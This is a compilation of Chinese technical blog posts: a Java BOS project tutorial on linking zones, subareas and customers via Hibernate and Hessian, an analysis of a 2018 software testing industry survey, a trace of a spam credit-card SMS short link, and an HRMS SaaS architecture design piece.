第六步：在SubareaAction中提供listajax()方法，查询未关联到定区的分区数据，并返回json数据
    /**     * 查询未关联到定区的分区数据，并返回json数据     * @return     * @throws IOException      */    public String listajax() throws IOException {        List<Subarea> list = subareaService.findListNotAssociation();        String[] excludes = new String[] {"region", "decidedzone"}; // 本例中我们只排除关联的区域对象和定区对象        this.writeList2Json(list, excludes);        return "none";    }
Service层代码：
    /**     * 查询未关联到定区的分区数据，即查询条件：decidedzone值为“null”     */    public List<Subarea> findListNotAssociation() {        // 创建离线条件查询对象        DetachedCriteria detachedCriteria = DetachedCriteria.forClass(Subarea.class);        // 向离线条件查询对象中封装条件        // detachedCriteria.add(Restrictions.eq("decidedzone", "null")); // 基本类型的属性使用eq()和ne()        detachedCriteria.add(Restrictions.isNull("decidedzone")); // 引用类型的属性使用isNull()和isNotNull()        return subareaDao.findByCriteria(detachedCriteria);    }
浏览器效果截图：
第七步：为添加/修改定区窗口中的保存按钮绑定事件
    <!-- 添加/修改分区 -->    <div style="height:31px;overflow:hidden;" split="false" border="false" >        <div class="datagrid-toolbar">            <a id="save" icon="icon-save" href="#" class="easyui-linkbutton" plain="true" >保存</a>            <script type="text/javascript">                $(function() {                    $("#save").click(function() {                        var v = $("#addDecidedzoneForm").form("validate");                        if (v) {                            $("#addDecidedzoneForm").submit(); // 页面会刷新                            // $("#addDecidedzoneForm").form("submit"); // 页面不会刷新                        }                    });                });            </script>        </div>    </div>
第八步：提交上面的添加定区的表单，发现id名称冲突浏览器截图：




代码截图：即：关联分区中的复选框的field的名称叫id，定区编码的name名称也叫id，造成冲突，服务器不能够区分开他们哪个id是定区，还是哪个id是分区，如何解决呢？答：我们应该类比于选择取派员的name的名称staff.id这样，如上图绿色框框中的那样，即我们可以把关联分区中的复选框的field的名称改为subareaid。即：我们要在Subarea类中提供getSubareaid()方法，就相当于给Subarea类中的字段id重新起个名字，这样返回的json数据中就含有subareaid字段了。Subarea.java改过之后，浏览器截图：第十步：创建定区管理的Action，提供add()方法保存定区，提供subareaid数组属性接收多个分区的subareaid
package com.itheima.bos.web.action;import org.springframework.context.annotation.Scope;import org.springframework.stereotype.Controller;import com.itheima.bos.domain.Decidedzone;import com.itheima.bos.web.action.base.BaseAction;/** * 定区设置 * @author Bruce * */@Controller@Scope("prototype")public class DecidedzoneAction extends BaseAction<Decidedzone> {    // 采用属性驱动的方式，接收页面提交过来的参数subareaid（多个，需要用到数组进行接收）    private String[] subareaid;    public void setSubareaid(String[] subareaid) {        this.subareaid = subareaid;    }    /**     * 添加定区     * @return     */    public String add() {        decidedzoneService.save(model, subareaid);        return "list";    }}
Service层代码：
package com.itheima.bos.service.impl;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Transactional;import com.itheima.bos.dao.IDecidedzoneDao;import com.itheima.bos.dao.ISubareaDao;import com.itheima.bos.domain.Decidedzone;import com.itheima.bos.domain.Subarea;import com.itheima.bos.service.IDecidedzoneService;@Service@Transactionalpublic class DecidedzoneServiceImpl implements IDecidedzoneService {    // 注入dao    @Autowired    private IDecidedzoneDao decidedzoneDao;    // 注入dao    @Autowired    private ISubareaDao subareaDao;    /**     * 添加定区     */    public void save(Decidedzone model, String[] subareaid) {        // 先保存定区表        decidedzoneDao.save(model);        // 再修改分区表的外键，java代码如何体现呢？答：让这两个对象关联下即可。谁关联谁都行。        // 但是在关联之前，我们应该有意识去检查下通过反转引擎自动生成出来的Hibernate配置文件中，谁放弃了维护外键的能力。        // 一般而言：是“一”的一方放弃。所以需要由“多”的一方来维护外键关系。        for (String sid : subareaid) {            // 根据分区id把分区对象查询出来，再让分区对象去关联定区对象model            Subarea subarea = subareaDao.findById(sid); // 持久化对象            // 分区对象 关联 定区对象 --> 多方关联一方            subarea.setDecidedzone(model); // 关联完之后，会自动更新数据库，根据快照去对比，看看我们取出来的持久化对象是否跟快照长得不一样，若不一样，就刷新缓存。            // 从效率的角度讲：我们应该拼接一个HQL语句去更新Subarea，而不是去使用Hibernate框架通过关联的方式更新            // HQL：update Subarea set decidedzone=? where id=? -->            // SQL：update bc_subarea set decidedzone_id=? where id=?        }    }}
第十一步：配置struts.xml
    <!-- 定区管理：配置decidedzoneAction-->    <action name="decidedzoneAction_*" class="decidedzoneAction" method="{1}">        <result name="list">/WEB-INF/pages/base/decidedzone.jsp</result>    </action>
2、定区分页查询
第一步：decidedzone.jsp页面修改datagrid的URL
    // 定区标准数据表格    $('#grid').datagrid( {        iconCls : 'icon-forward',        fit : true,        border : true,        rownumbers : true,        striped : true,        pageList: [30,50,100],        pagination : true,        toolbar : toolbar,        url : "${pageContext.request.contextPath}/decidedzoneAction_pageQuery.action",        idField : 'id',        columns : columns,        onDblClickRow : doDblClickRow    });
第二步：在DecidedzoneAction中提供分页查询方法
    /**     * 分页查询     * @return     * @throws IOException      */    public String pageQuery() throws IOException {        decidedzoneService.pageQuery(pageBean);        String[] excludes = new String[] {"currentPage", "pageSize", "detachedCriteria", "subareas", "decidedzones"};        this.writePageBean2Json(pageBean, excludes);        return "none";    }
第三步：修改Decidedzone.hbm.xml文件，取消懒加载

3、hessian入门 --> 远程调用技术


Hessian是一个轻量级的 remoting on http 工具，使用简单的方法提供了RMI(Remote Method Invocation 远程方法调用)的功能。相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议(Remote Procedure Call Protocol 远程过程调用协议)，因为采用的是二进制协议，所以它很适合于发送二进制数据。


常见的远程调用的技术：

1、webservice（CXF框架、axis框架），偏传统，基于soap（简单对象访问协议）协议，传输的是xml格式的数据，数据冗余比较大，传输效率低。现在也支持json。
2、httpclient --> 电商项目：淘淘商城，大量使用
3、hessian --> http协议、传输的是二进制数据，冗余较少，传输效率较高。
4、dubbo --> 阿里巴巴



Dubbo是阿里巴巴SOA服务化治理方案的核心框架，每天为2,000+个服务提供3,000,000,000+次访问量支持，并被广泛应用于阿里巴巴集团的各成员站点。自开源后，已有不少非阿里系公司在使用Dubbo。


Tengine是由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。


hessian有两种发布服务的方式：

1、使用hessian框架自己提供的HessianServlet发布：com.caucho.hessian.server.HessianServlet
2、和spring整合发布服务：org.springframework.web.servlet.DispatcherServlet



hessian入门案例


服务端开发：第一步：创建一个java web项目，并导入hessian的jar包第二步：创建一个接口
    public interface HelloService {        public String sayHello(String name);        public List<User> findAllUser();    }
第三步：提供上面接口的实现类
    public class HelloServiceImpl implements HelloService {        public String sayHello(String name) {            System.out.println("sayHello方法被调用了");            return "hello " + name;        }        public List<User> findAllUser() {            List<User> list = new ArrayList<User>();            list.add(new User(1, "小艺"));            list.add(new User(2, "小军"));            return list;        }    }
第四步：在web.xml中配置服务
    <servlet>        <servlet-name>hessian</servlet-name>        <servlet-class>com.caucho.hessian.server.HessianServlet</servlet-class>        <init-param>            <param-name>home-class</param-name>            <param-value>com.itheima.HelloServiceImpl</param-value>        </init-param>        <init-param>            <param-name>home-api</param-name>            <param-value>com.itheima.HelloService</param-value>        </init-param>    </servlet>    <servlet-mapping>        <servlet-name>hessian</servlet-name>        <url-pattern>/hessian</url-pattern>    </servlet-mapping>
客户端开发：第一步：创建一个客户端项目(普通java项目即可)，并导入hessian的jar包第二步：创建一个接口（和服务端接口对应）
    public interface HelloService {        public String sayHello(String name);        public List<User> findAllUser();    }
第三步：使用hessian提供的方式创建代理对象调用服务
public class Test {    public static void main(String[] args) throws MalformedURLException {        // 通过hessian提供的工厂类创建一个代理对象，通过这个代理对象可以远程调用服务        HessianProxyFactory factory = new HessianProxyFactory();        HelloService proxy = (HelloService) factory.create(HelloService.class, "http://localhost:8080/hessian_server/hessian");        String ret = proxy.sayHello("test");        System.out.println(ret);        List<User> list = proxy.findAllUser();        for (User user : list) {            System.out.println(user.getId() + "---" + user.getName());        }    }}
4、基于hessian实现定区关联客户
4.1、发布crm服务并测试访问
第一步：创建动态的web项目crm，导入hessian的jar第二步：创建一个crm数据库和t_customer表




第三步：在web.xml中配置spring的DispatcherServlet
    <!-- hessian发布服务的方式：和spring整合发布服务：org.springframework.web.servlet.DispatcherServlet -->    <servlet>        <servlet-name>remoting</servlet-name>        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>        <load-on-startup>1</load-on-startup>    </servlet>    <servlet-mapping>        <servlet-name>remoting</servlet-name>        <url-pattern>/remoting/*</url-pattern>    </servlet-mapping>
第四步：提供接口CustomerService和Customer类、Customer.hbm.xml映射文件CustomerService.java
package cn.itcast.crm.service;import java.util.List;import cn.itcast.crm.domain.Customer;// 客户服务接口 public interface CustomerService {    // 查询未关联定区客户    public List<Customer> findnoassociationCustomers();    // 查询已经关联指定定区的客户    public List<Customer> findhasassociationCustomers(String decidedZoneId);    // 将未关联定区客户关联到定区上    public void assignCustomersToDecidedZone(Integer[] customerIds, String decidedZoneId);}
第五步：为上面的CustomerService接口提供实现类
package cn.itcast.crm.service.impl;import java.util.List;import org.hibernate.Session;import cn.itcast.crm.domain.Customer;import cn.itcast.crm.service.CustomerService;import cn.itcast.crm.utils.HibernateUtils;public class CustomerServiceImpl implements CustomerService {    public List<Customer> findnoassociationCustomers() {        Session session = HibernateUtils.openSession();        session.beginTransaction();        String hql = "from Customer where decidedzone_id is null";        List<Customer> customers = session.createQuery(hql).list();        session.getTransaction().commit();        session.close();        return customers;    }    public List<Customer> findhasassociationCustomers(String decidedZoneId) {        Session session = HibernateUtils.openSession();        session.beginTransaction();        String hql = "from Customer where decidedzone_id=?";        List<Customer> customers = session.createQuery(hql).setParameter(0, decidedZoneId).list();        session.getTransaction().commit();        session.close();        return customers;    }    public void assignCustomersToDecidedZone(Integer[] customerIds, String decidedZoneId) {        Session session = HibernateUtils.openSession();        session.beginTransaction();        // 取消定区所有关联客户        String hql2 = "update Customer set decidedzone_id=null where decidedzone_id=?";        session.createQuery(hql2).setParameter(0, decidedZoneId).executeUpdate();        // 进行关联        String hql = "update Customer set decidedzone_id=? where id=?";        if (customerIds != null) {            for (Integer id : customerIds) {                session.createQuery(hql).setParameter(0, decidedZoneId).setParameter(1, id).executeUpdate();            }        }        session.getTransaction().commit();        session.close();    }}
第六步：在WEB-INF目录提供spring的配置文件remoting-servlet.xml
    <!-- 通过配置的方式对外发布服务 -->    <!-- 业务接口实现类  -->    <bean id="customerService" class="cn.itcast.crm.service.impl.CustomerServiceImpl" />    <!-- 注册hessian服务 -->    <bean id="/customer" class="org.springframework.remoting.caucho.HessianServiceExporter">        <!-- 业务接口实现类 -->        <property name="service" ref="customerService" />        <!-- 业务接口 -->        <property name="serviceInterface" value="cn.itcast.crm.service.CustomerService" />    </bean>
第七步：发布crm服务第八步：在hessian_client客户端调用crm服务获得客户数据注意：拷贝接口CustomerService代码文件放到客户端中，同时必须在hessian_client客户端新建和crm服务端一样的实体Bean目录，如下图所示：




hessian_client客户端调用代码如下：
package com.itheima;import java.net.MalformedURLException;import java.util.List;import org.junit.Test;import com.caucho.hessian.client.HessianProxyFactory;import cn.itcast.crm.domain.Customer;public class TestService {    @Test    public void test1() throws MalformedURLException {        // 通过hessian提供的工厂类创建一个代理对象，通过这个代理对象可以远程调用服务        HessianProxyFactory factory = new HessianProxyFactory();        CustomerService proxy = (CustomerService) factory.create(CustomerService.class, "http://localhost:8080/crm/remoting/customer");        List<Customer> list = proxy.findnoassociationCustomers();        for (Customer customer : list) {            System.out.println(customer);        }        // 上面的演示方式：我们手动创建一个代理对象，通过代理对象去调用，然后获取服务端发布的客户数据。        // 实际的开发方式：我们只需要在applicationContext.xml中配置一下，由spring工厂帮我们去创建代理对象，再将该代理对象注入给action去使用它即可。        // 如何配置呢？配置相关代码如下：        /*        <!-- 配置远程服务的代理对象 -->        <bean id="customerService" class="org.springframework.remoting.caucho.HessianProxyFactoryBean">            <property name="serviceInterface" value="cn.itcast.bos.service.ICustomerService"/>            <property name="serviceUrl" value="http://localhost:8080/crm/remoting/customer"/>        </bean>        */    }}
客户端控制台输出：
cn.itcast.crm.domain.Customer@59b746fcn.itcast.crm.domain.Customer@20f92649cn.itcast.crm.domain.Customer@45409388cn.itcast.crm.domain.Customer@1295e93dcn.itcast.crm.domain.Customer@3003ad53cn.itcast.crm.domain.Customer@41683cc5cn.itcast.crm.domain.Customer@226dcb0fcn.itcast.crm.domain.Customer@562e5771
服务端控制台输出：
Hibernate:     select        customer0_.id as id0_,        customer0_.name as name0_,        customer0_.station as station0_,        customer0_.telephone as telephone0_,        customer0_.address as address0_,        customer0_.decidedzone_id as decidedz6_0_     from        t_customer customer0_     where        customer0_.decidedzone_id is null
4.2、在bos项目中调用crm服务获得客户数据
第一步：在bos项目中导入hessian的jar包第二步：从crm项目中复制CustomerService接口和Customer类到bos项目中第三步：在spring配置文件中配置一个远程服务代理对象，调用crm服务
    <!-- 配置远程服务的代理对象 -->    <bean id="customerService" class="org.springframework.remoting.caucho.HessianProxyFactoryBean">        <property name="serviceInterface" value="com.itheima.bos.crm.CustomerService"/>        <property name="serviceUrl" value="http://localhost:8080/crm/remoting/customer"/>    </bean>
第四步：将上面的代理对象通过注解方式注入到BaseAction中
    @Autowired     protected CustomerService customerService;
第五步：为定区列表页面中的“关联客户”按钮绑定事件，发送2次ajax请求访问DecidedzoneAction，在DecidedzoneAction中调用hessian代理对象，通过代理对象可以远程访问crm获取客户数据，获取数据后进行解析后，填充至左右下拉框中去
    // 设置全局变量：存储选中一个定区时的 定区id    var decidedzoneid;    // 关联客户窗口    function doAssociations(){        // 在打开关联客户窗口之前判断是否选中了一个定区，即获得选中的行        var rows = $("#grid").datagrid("getSelections");        if (rows.length == 1) {            // 打开窗口            $("#customerWindow").window('open');            // 清空窗口中的下拉框内容            $("#noassociationSelect").empty();            $("#associationSelect").empty();            // 发送ajax请求获取未关联到定区的客户(左侧下拉框)            var url1 = "${pageContext.request.contextPath}/decidedzoneAction_findnoassociationCustomers.action";            $.post(url1, {}, function(data) {                // alert(data); // json数据                // 解析json数据，填充至左侧下拉框中去                for (var i = 0; i < data.length; i++) {                    var id = data[i].id;                    var name = data[i].name;                    $("#noassociationSelect").append("<option value='" + id + "'>" + name + "</option>");                }            }, 'json');            decidedzoneid = rows[0].id;            // 发送ajax请求获取关联到当前选中定区的客户(右侧下拉框)            var url2 = "${pageContext.request.contextPath}/decidedzoneAction_findhasassociationCustomers.action";            $.post(url2, {"id":decidedzoneid}, function(data) {                // alert(data); // json数据                // 解析json数据，填充至右侧下拉框中去                for (var i = 0; i < data.length; i++) {                    var id = data[i].id;                    var name = data[i].name;                    $("#associationSelect").append("<option value='" + id + "'>" + name + "</option>");                }            }, 'json');        } else {            // 没有选中或选中多个，提示信息            $.messager.alert("提示信息","请选择一条定区记录进行操作","warning");        }    }
第六步：为“左右移动按钮”绑定事件
    <td>        <input type="button" value="》》" id="toRight"><br/>        <input type="button" value="《《" id="toLeft">        <script type="text/javascript">            $(function() {                // 为右移动按钮绑定事件                $("#toRight").click(function() {                    $("#associationSelect").append($("#noassociationSelect option:selected"));                    $("#associationSelect>option").removeAttr("selected"); // 移除它们默认的选中状态                });                // 为右移动按钮绑定事件                $("#toLeft").click(function() {                    $("#noassociationSelect").append($("#associationSelect option:selected"));                    $("#noassociationSelect>option").removeAttr("selected"); // 移除它们默认的选中状态                });            });        </script>    </td>
第七步：为关联客户窗口中的“关联客户”按钮绑定事件
<script type="text/javascript">    $(function() {        // 为关联客户按钮绑定事件        $("#associationBtn").click(function() {            // 在提交表单之前，选中右侧下拉框中所有的选项            $("#associationSelect option").attr("selected", "selected"); // attr(key, val) 给一个指定属性名设置值            // 在提交表单之前设置隐藏域的值（定区id）            $("input[name=id]").val(decidedzoneid);            // 提交表单            $("#customerForm").submit();        });    });</script>
第八步：在定区Action中接收提交的参数，调用crm服务实现定区关联客户的业务功能
    // 采用属性驱动的方式，接收页面提交过来的参数customerIds（多个，需要用到数组进行接收）    private Integer[] customerIds;    public void setCustomerIds(Integer[] customerIds) {        this.customerIds = customerIds;    }    /**     * 将未关联定区的客户关联到定区上     * @return     */    public String assignCustomersToDecidedZone() {        customerService.assignCustomersToDecidedZone(customerIds, model.getId());        return "list";    }

********************************************************************************************************************************************************************************************************
解析！2018软件测试官方行业报告
前段时间，来自QA Intelligence的2018年度软件测试行业年度调查报告已经隆重出炉了。
《软件测试行业现状报告》旨在为测试行业和全球测试社区提供最准确的信息，是全球最大的测试行业调研报告，来自80多个国家的约1500名受访者参与了此次调研。
这份报告针对软件测试的年度行业现状进行了调研，并给出了非常具体的数据统计。对于软件测试从业人员而言，是一个很好的可以用来了解行业趋势、职业状态的窗口，能为我们职业发展的方向提供强有力的数据支撑。
下面就跟大家一起来解析这份报告都告诉了我们一些什么事情。
 
1.　　首先我们关注的是，测试人员的入行途径：

解析：
可以看到相当部分的入行者对于软件测试这个行业有着直观的兴趣，并且很多是从其他行业和职位转行而来。这说明软件测试工程师这样的职位越来越被知晓和了解，而且对于这个行业很多人持看好的态度。
 
2.　　测试工作占工作时间的百分比：

解析：
这个数据统计分析的潜台词其实是：“软件测试人员是否是专职测试”。从图标中的高占比可以看出，独立专职的测试仍然是业界主流。
 
3.　　测试人员的薪资状况：
 
解析：
我们最关注的当然是中国测试从业人员的薪资，从图表中我们可以明显看出，中国测试从业人员的起步薪资处在比较低的水平。但随着经验的积累，大于五年经验的测试工程师在薪资水平上有可观的提升。整体薪资虽然只是北美和西欧的一半左右，但是也处在一个比较不错的水准。
 
4.　　软件测试的职能定位和团队规模：

解析：
可以看到，测试团队的规模正在逐渐呈现缩减的状态。这与IT行业本身的发展大趋势保持一致，研发节奏的加快，敏捷理念的普遍应用，都使得小规模的团队构成变得越来越流行。
这一行业现状也可以解释测试人员正越来越多的受到项目经理和开发经理的直接领导。
 
5.　　测试人员的额外工作：
 
 
解析：
自动化测试工作的高占比是一个很好的现象，也说明了自动化测试技术在项目内受到了更多的重视和成功应用。而其他工作的高占比也说明，软件测试职位正在渐渐摆脱传统的误解和偏见--即将软件测试简单的与功能测试和测试执行等同起来的偏见。
 
6.　　测试方法和方法论：
 
 
 
解析：
探索性/基于会话的测试仍然是测试方法中的主流。值得注意的是，一些比较新的尝试方法已经在实际工作环境中得到了应用。
 
7.　　静态测试：
 
 
解析：
测试人员对于静态测试，各种评审会议的投入明显增加。
 
8.　　测试人员技能提升方法：

解析：
可以看出，测试人员在技能提升这个领域里，对书籍的依赖有所降低。
 
9.　　测试人员需要的技能：

解析：
沟通能力，自动化技术能力，通用测试方法论占据了前三甲。这些能力你掌握得怎么样呢？
 
10.　　软件测试的对象：
 
解析：
网页测试项目仍然是最主流，而手机项目所占比重已经令人惊讶的超过了桌面应用。网页，APP相关的测试技能是我们测试从业人员的攻坚重点。
 
11.　　软件开发模式：
 
 
解析：
敏捷和类敏捷型项目已经占到了已经极高的百分比，而DevOps模式的使用已经持续数年稳定增长，看来DevOps有必要成为我们测试进修课程上的必备项目。
 
 12.　　自动化测试的应用趋势：

解析：
自动化测试在研发项目里被使用的比例基本保持稳定，而85%的高占比很好的体现了自动化技术的流行。我们还能看出，自动化技术应用最广的领域仍然是功能和回归测试方面。
 
最后我们来看看测试经理对于测试人员素质最关注的要点：

想要转行从业测试，或者想要跳槽寻求进一步发展的同学，可以关注一下这些内容啦。
 
好了，2018行业报告的解析就到这里，希望可以对从业测试的你有所帮助和启发！
 
********************************************************************************************************************************************************************************************************
记录一次垃圾短信网站短链分析
 
垃圾办信用卡短信数据分析

最近天天收到叫我办理某银行的信用卡的短信，让我们感觉和真的一样，其实，很多都是套路，都是别人拿来套用户的信息的。下面我们来看下短信


常理分析
分析一下下面这条短信，首先乍一看这个短信好像很真实的感觉，广发银行，并且带有申请链接。并且号码并不是手机号码，而是短信中心的号码。
深度分析


上网查询该中心号码：



 

可以断定该短信为垃圾短信了



网址分析
通过浏览器访问打开短信中的链接可以看到如下页面跳转



有以下操作：


http://t.cn/EhuFsFj 请求短连接


http://b1.callaso.cn:8181/dcp/tDcpClickLogController.do?tourl&mobile=MTg5NzkxOTg2NTM%3D&destUrl=http%3A%2F%2Fa1.callaso.cn%2Fguangfaxyk_sh_n.html%3Fxbd1008_dpi_c10_zg_gf_7w


 短连接跳转到该网站，应该是一个呗用来做日志请求的


http://s13.cnzz.com/z_stat.php?id=1274023635&online=1 :该网站用于数据统计


http://online.cnzz.com/online/online_v3.php?id=1274023635&h=z7.cnzz.com&on=1&s= ：统计在线时长


http://95508.com/zct7uhBO 访问广发申请信用卡页面


https://wap.cgbchina.com.cn/creditCardApplyIn.do?seqno=cTxRTfSvURuypt-PwsdceQ4a9bBB4b549Bb95Ba9Z&orginalFlowNo=Y6wzfeQcRUxTdvPtu7-wSfyps9m14a49BbB1BbBBB9_DB&createTime=R9tRPRs-TSUdQfpcey14_4B49b_9DaBby&ACTIVITY_ID=lSMTfyRfePpcsS-Qd99BDBBBBB_1b： 跳转广发信用卡申请中心页面


以上是一个请求过程，其实这个过程大概是这样，短连接->请求真实网址->进行网站数据统计->跳转广发申请信用卡页面，然后你再去填写相关信息。
 


其中危机：


由于为短连接，可能黑客可能在中途拦截，或者注入一些抓取数据的脚本，导致用户信息泄露


当你访问该网站时候，你的用户的IP会被CNZZ统计


虽然说现在该网站最终请求的是一个真正的广发银行信用卡申请的网站，这是推广的一个网站



思考


现在的垃圾短信众多，其实办理信用卡的短信一般也不会发送到你的手机上，一般这种短信百分之90都是假的，要么是套取你的个人信息，要么就是推荐你办理信用卡赚取佣金的



********************************************************************************************************************************************************************************************************
HRMS(人力资源管理系统)-SaaS架构设计-概要设计实践
一、开篇
      前期我们针对架构准备阶段及需求分析这块我们写了2篇内容《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-下篇》内容来展开说明。
       本篇主将详细的阐述架构设计过程中概要架构设计要点来和大家共同交流，掌握后续如何强化概要架构设计在架构设计中作用，帮助我们快速确认架构的方向及核心大框架。
      在阐述具体的概要架构工作方法之前，还请大家先参考我们限定的业务场景：
     1、HRMS系统的介绍？（涵盖哪些功能？价值和作用是什么？行业什么情况？）
      请阅读《HRMS(人力资源管理系统)-从单机应用到SaaS应用-系统介绍》
      2、本章分析的内容将围绕4类企业代表的业务场景，（区分不同规模企业的关注点，规模将决定系统的设计方案）
      本篇将围绕4类企业代表来阐述不同规模企业对于HRMS的需求及应用

      A、100人以下的中小企业
      B、500人以下的大中型企业
      C、1000人以上的集团化大企业
      D、全球类型的公司体系（几万人）

      3、架构师在设计该系统时的职责及具备的核心能力是什么？
      请阅读《系统架构系列-开篇介绍》
 
一、关于概要架构阶段
 
1.1、概要架构的定义
       概念架构就是对系统设计的最初构想，就是把系统最关键的设计要素及交互机制确定下来，然后再考虑具体的技术应用，设计出实际架构。概念架构阶段主抓大局，不拘小节，不过分关注设计实现的细节内容。
       概要架构阶段的特点：

Ø满足“架构=组件+交互”的基本定义(所有架构都逃离不了该模式)
Ø对高层组件的“职责”进行笼统界定，并给出高层组件的相互关系
Ø不应涉及接口细节

在讲具体的概要架构设计实践之前，请大家思考以下问题：

Ø不同系统的架构，为什么不同？
Ø架构设计中，应何时确立架构大方向的不同？（功能、质量、约束
 

1.2、行业现状
1.2.1、误将“概要架构”等同于“理想架构”

架构设计是功能需求驱动的，对吗？
架构设计是用例驱动的，对吗？
实际上架构设计的驱动力：功能+质量+约束

1.2.2、误把“阶段”当“视图”

概要架构阶段还是概念视图？
阶段体现先后关系，视图体现并列关系
概要架构阶段根据重大需求、特殊需求、高风险需求形成稳定的高层架构设计成果
 

1.3、主要工作内容及目标

       概念架构是一个架构设计阶段，必须在细化架构设计阶段之前，针对重大需求，特色需求、高风险需求、形成文档的高层架构设计成果。
       重大需求塑造概念架构，这里的重大需求涵盖功能、质量、约束等3类需求的关键内容。
       如果只考虑功能需求来设计概念架构，将导致概念架构沦为“理想化的架构”，这个脆弱的架构不久就会面临“大改”的压力，甚至直接导致项目失败。
 
二、概要架构阶段的方法及科学实践过程是什么？
 

整体可分为3个阶段：

1、通过鲁棒图：初步设计的目标就是发现职责，运用“职责协作链”原理画鲁棒图
2、高层分割：运用成熟的经验及方法论，结合场景选择合适的架构模式来确定系统的层级关系
3、质疑驱动：考虑非功能性需求来不断驱动概要架构设计过程。

2.1、初步设计的目标就是发现职责，运用“职责协作链”原理画鲁棒图

鲁棒图的三种对象：

•边界对象对模拟外部环境和未来系统之间的交互进行建模。边界对象负责接 收外部输入、处理内部内容的解释、并表达或传递相应的结果。
•控制对象对行为进行封装，描述用例中事件流的控制行为。
•实体对象对信息进行描述，它往往来自领域概念，和领域模型中的对象有良好的对应关系。

初步设计原则

•初步设计的目标是“发现职责”，为高层切分奠定基础
•初步设计“不是”必须的，但当“待设计系统”对架构师而言并无太多直接 经验时，则强烈建议进行初步设计
•基于关键功能（而不是对所有功能）、借助鲁棒图（而不是序列图，序列图太细节）进行初 步设计


       关于这几个对象的区别，请参考《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》中有描述鲁棒图的基本用法说明。后续本文将直接使用不再复述具体的用法。
       大家看完鲁棒图发现鲁棒图也有实体、控制及边界对象，怎么这么类似web系统时用到的MVC模式，那么我们这里对比下这2个模式的异同点:

       通过上面的对比我们发现，鲁棒图能够更全面的体现架构设计过程中涉及的内容，单独的架构模式更侧重其中的部分架构层次，比如逻辑架构采取MVC的模式。
2.2、高层分割（概念架构形成的具体操作方法）
1）、直接分层

2）、先划分为子系统，再针对每个子系统分层

针对高层分割，我们可以采取分阶段的模式来进行落地实践：

1、直接划分层次：直接把系统划分为多个层次，梳理清晰各层次间的关联关系
2、分为2个阶段：先划分为多个子系统，然后再梳理子系统的层次，梳理清晰没格子系统的层次关系

针对分层模式的引入，这里分享几类划分模式及方法：

1、逻辑层：逻辑层，上层使用下层观念；不关注物理划分，也不关注通用性
2、物理层：分布部署在不同机器上
3、通用性分层：通用性越多，所处层次越靠下

 
2.2.1、Layer：逻辑层
Layer：逻辑层，上层使用下层观念；不关注物理划分，也不关注通用性。Layer是逻辑上组织代码的形式。比如逻辑分层中表现层，服务层，业务层，领域层，他们是软件功能来划分的。并不指代部署在那台具体的服务器上或者，物理位置。

        多层Layer架构模式
       诸如我们常见的三层架构模式，三层架构(3-tier architecture) 通常意义上的三层架构就是将整个业务应用划分为：界面层（User Interface layer）、业务逻辑层（Business Logic Layer）、数据访问层（Data access layer）。区分层次的目的即为了“高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构。微软推荐的分层式结构一般分为三层，从下至上分别为：数据访问层、业务逻辑层（又或称为领域层）、表示层。
逻辑层次的架构能帮助我们解决逻辑耦合，达到灵活配置，迁移。 一个良好的逻辑分层可以带来：

A、逻辑组织代码/代码逻辑的清晰度
B、易于维护（可维护性）
C、代码更好的重用（可重用性）
D、更好的团队开发体验（开发过程支持）
 

2.2.2、Tier：物理层
Tier：物理层，各分层分布部署在不同机器上，Tier这指代码运行部署的具体位置，是一个物理层次上的划为，Tier就是指逻辑层Layer具体的运行位置。所以逻辑层可以部署或者迁移在不同物理层，一个物理层可以部署运行多个逻辑层。

       Tier指代码运行的位置，多个Layer可以运行在同一个Tier上的，不同的Layer也可以运行在不同的Tier上，当然，前提是应用程序本身支持这种架构。以J2EE和.NET平台为例，大多数时候，不同的Layer之间都是直接通过DLL或者JAR包引用来完成调用的（例如：业务逻辑层需要引用数据访问层），这样部署的时候，也只能将多个Layer同时部署在一台服务器上。相反，不同的Layer之间如果是通过RPC的方式来实现通信调用的，部署的时候，便可以将不同的Layer部署在不同的服务器上面，这也是很常见的解耦设计。 
一个良好的物理架构可以带来：

A、性能的提升 
B、可伸缩性 
C、容错性
D、安全性

2.2.3、通用性分层
采取通用性分层模式，原则是通用性越多，所处层次越靠下

并且各层的调用关系是自上而下的，越往下通用性越高。
2.3、质疑驱动，不断完善系统架构（质量属性及约束决定了架构的演变）
基于系统中的重大功能来塑造概念架构的高层框架，过程中需要通过质量及约束等非功能性需求不断质疑初步的概念架构，逐步让这个概念架构完善，能够满足及支撑各类质量及约束的要求。具体的操作方法我们可以采取之前篇幅《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》中介绍的 “目标-场景-决策表” 来实现。
Ø通过“目标-场景-决策表”分析非功能需求：

通过分析关键的质量及约束内容，给出具体的场景及应对策略，梳理出清晰的决策表，在概念架构阶段融合决策表中给出的方案，最终给出初步的概念架构设计。
 
三、基于前面分析的HRMS系统？我们如何下手开始？
结合前面讲的需求梳理的要点内容，我们结合HRMS系统来进行应用实践，逐步形成概要架构设计。
A、基于RelationRose 来画出鲁棒图、确定系统的边界及关键内容
1)、分析系统中的参与者及应用功能边界：

基于上面我们能够发现我们的核心功能点：

组织管理：主要实现对公司组织结构及其变更的管理；对职位信息及职位间工作关系的管理，根据职位的空缺进行人员配备；按照组织结构进行人力规划、并对人事成本进行计算和管理，支持生成机构编制表、组织结构图等
人事档案：主要实现对员工从试用、转正直至解聘或退休整个过程中各类信息的管理，人员信息的变动管理，提供多种形式、多种角度的查询、统计分析手段
劳动合同：提供对员工劳动合同的签订、变更、解除、续订、劳动争议、经济补偿的管理。可根据需要设定试用期、合同到期的自动提示
招聘管理：实现从计划招聘岗位、发布招聘信息、采集应聘者简历，按岗位任职资格遴选人员，管理面试结果到通知试用的全过程管理
